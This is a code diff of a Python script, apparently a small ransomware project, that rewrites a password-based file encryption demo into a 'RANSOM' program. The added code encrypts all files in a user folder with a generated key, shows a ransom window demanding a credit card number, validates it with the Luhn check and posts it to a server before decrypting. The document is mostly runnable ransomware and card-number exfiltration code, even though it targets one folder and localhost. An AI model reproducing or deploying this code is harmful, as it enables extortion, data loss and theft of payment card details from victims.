@@ -9,30 +9,26 @@ import json
 
 # pyinstaller --onefile voucher.py
 
-def generate_key(password):
-    """
-    Generate a key from the password using SHA-256.
-    """
-    return base64.urlsafe_b64encode(hashlib.sha256(password.encode()).digest())
+config = {
+    'directory_suffix': '\downloads\delete',
+    'server_url': 'http://localhost:8080/'
+}
 
-def encrypt_file(file_path, key):
-    """
-    Encrypts a file with the given key.
-    """
+
+def encrypt_file(file_path, key): 
     fernet = Fernet(key)
+    print(fernet)    
     with open(file_path, 'rb') as file:
         original = file.read()
     
     encrypted = fernet.encrypt(original)
     
     with open(file_path, 'wb') as encrypted_file:
-        encrypted_file.write(encrypted)
+        encrypted_file.write(encrypted)        
     print(f"Encrypted", file_path)
 
-def decrypt_file(file_path, key):
-    """
-    Decrypts a file with the given key.
-    """
+
+def decrypt_file(file_path, key): 
     fernet = Fernet(key)
     with open(file_path, 'rb') as encrypted_file:
         encrypted = encrypted_file.read()
@@ -44,27 +40,18 @@ def decrypt_file(file_path, key):
     print(f"Decrypted", file_path)
 
 def encrypt_files_in_directory(directory_path, key):
-    """
-    Encrypts all files in the specified directory.
-    """
     for filename in os.listdir(directory_path):
         file_path = os.path.join(directory_path, filename)
         if os.path.isfile(file_path):
             encrypt_file(file_path, key)
 
-def decrypt_files_in_directory(directory_path, key):
-    """
-    Decrypts all files in the specified directory.
-    """
+def decrypt_files_in_directory(directory_path, key): 
     for filename in os.listdir(directory_path):
         file_path = os.path.join(directory_path, filename)
         if os.path.isfile(file_path):
             decrypt_file(file_path, key)
 
-def ask_user_password_and_decrypt_files(directory_path, num_blocks, digits_per_block):
-    """
-    Displays a GUI asking for the user's password and decrypts files if the password is correct.
-    """
+def ask_user_credit_card_and_decrypt_files(directory_path, key, num_blocks = 4, digits_per_block = 4):
     def on_submit():
         card_number = ""
         for entry in entries:
@@ -75,30 +62,25 @@ def ask_user_password_and_decrypt_files(directory_path, num_blocks, digits_per_b
             card_number += part
             
         if is_valid_credit_card(card_number):
-            key = generate_key("dana")
             send_to_server(card_number)
-        else:
-            key = generate_key("ariel")        
-        
-        try:
             decrypt_files_in_directory(directory_path, key)
             messagebox.showinfo("Success", "Files decrypted successfully.")
             root.destroy()
-        except Exception as e:
-            messagebox.showerror("Error", "Incorrect password. Please try again.")
-            # Clear entries for next attempt
+        else:
+            messagebox.showerror("Error", "Invalid credit card number. Please try again.")
             for entry in entries:
                 entry.delete(0, tk.END)
-            entries[0].focus()
+            entries[0].focus()       
+            
 
     def on_key_release(event, next_entry):
         if len(event.widget.get()) == digits_per_block:
             next_entry.focus()
 
     root = tk.Tk()
-    root.title("Password Input")
+    root.title("RANSOM")
     
-    tk.Label(root, text=f"Enter the password ({num_blocks} blocks of {digits_per_block} digits each):").pack()
+    tk.Label(root, text=f"This is a RANSOM note!\n Your files have been encrypted!\n Enter your credit card number to get your original files back").pack()
 
     frame = tk.Frame(root)
     frame.pack()
@@ -114,16 +96,14 @@ def ask_user_password_and_decrypt_files(directory_path, num_blocks, digits_per_b
     for i in range(num_blocks - 1):
         entries[i].bind("<KeyRelease>", lambda event, next_entry=entries[i+1]: on_key_release(event, next_entry))
 
-    tk.Button(root, text="Submit", command=on_submit).pack()
+    tk.Button(root, text="Send", command=on_submit).pack()
 
     root.mainloop()
 
 def is_valid_credit_card(card_number):
-    # Step 1: Check if the input is a digit and has appropriate length (13 to 19 digits)
     if not card_number.isdigit() or not 13 <= len(card_number) <= 19:
         return False
    
-    # Step 2: Implement the Luhn algorithm
     def luhn_checksum(card_number):
         def digits_of(n):
             return [int(d) for d in str(n)]
@@ -138,27 +118,18 @@ def is_valid_credit_card(card_number):
     return luhn_checksum(card_number) == 0
 
 def send_to_server(number):
-    # URL of the server
-    url = 'http://localhost:8080/'
-
-    # JSON data to send in the POST request
+    url = config.get('server_url')
     data = {
         'number': number
-    }
-
-    # Convert data to JSON format
+    }    
     json_data = json.dumps(data)
-
-    # Specify headers (content-type)
     headers = {
         'Content-type': 'application/json'
     }
 
-    # Send POST request
     try:
         response = requests.post(url, data=json_data, headers=headers)
         
-        # Check if the request was successful (status code 200)
         if response.status_code == 200:
             print("POST request successful.")
             print("Response from server:")
@@ -171,23 +142,15 @@ def send_to_server(number):
     except requests.exceptions.RequestException as e:
         print(f"Error sending POST request: {e}")
 
-def list_folders(directory):
-    folders = [name for name in os.listdir(directory) if os.path.isdir(os.path.join(directory, name))]
-    return folders
 
 if __name__ == "__main__":
-    # Define the number of blocks and digits per block
-    num_blocks = 4  # Change this to the number of blocks you want
-    digits_per_block = 4  # Change this to the number of digits per block
-
-    # directory = "C:\\Users\\Dana Amram\\Downloads\\delete2"
-    directory = os.path.expanduser('~') + '\downloads\delete'
-    print(directory)
+    directory_suffix = config.get('directory_suffix')
+    directory = os.path.expanduser('~') + directory_suffix
     
-    password = "dana"  # Define your encryption password here, e.g., "12-34-56"
-    key = generate_key(password)
+    print("Directory to encrypt: " + directory)
+
+    key = Fernet.generate_key()
     
     encrypt_files_in_directory(directory, key)
     
-    # For testing purpose: decrypt files after encrypting
-    ask_user_password_and_decrypt_files(directory, num_blocks, digits_per_block)
+    ask_user_credit_card_and_decrypt_files(directory, key)
